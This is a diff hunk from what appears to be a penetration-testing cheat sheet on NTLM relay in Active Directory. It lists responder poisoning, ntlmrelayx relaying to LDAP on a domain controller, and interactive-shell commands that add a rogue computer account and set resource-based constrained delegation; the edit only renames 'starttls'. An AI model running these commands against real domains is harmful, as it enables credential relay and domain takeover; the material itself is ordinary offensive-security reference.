@@ -16,7 +16,7 @@ responder -I <interface> -v
 ```shell
 ntlmrelayx -t ldap://<dc_ip> -smb2support --interactive
 nc 127.0.0.1 11000
-# starttls
+# start_tls
 # add_computer fakePC P@ssword123
 # set_rbcd <target_rbcd> fakePC$ 
 ```
